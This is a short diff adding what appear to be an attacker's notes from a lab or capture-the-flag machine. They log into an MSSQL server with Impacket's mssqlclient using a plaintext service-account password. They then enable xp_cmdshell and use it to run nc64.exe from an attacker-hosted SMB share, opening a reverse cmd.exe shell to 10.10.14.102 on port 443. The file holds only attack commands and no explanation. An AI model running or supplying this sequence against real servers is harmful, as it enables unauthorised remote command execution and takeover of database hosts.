@@ -1,0 +1,7 @@
+mssqlclient.py mssql-svc:'corporate568'@10.129.6.7 -windows-auth
+
+10.10.14.102
+xp_cmdshell \\10.10.14.102\giang\nc64.exe -e cmd.exe 10.10.14.102 443
+mssqlclient.py mssql-svc:'corporate568'@10.129.6.7 -windows-auth
+enable_xp_cmdshell
+
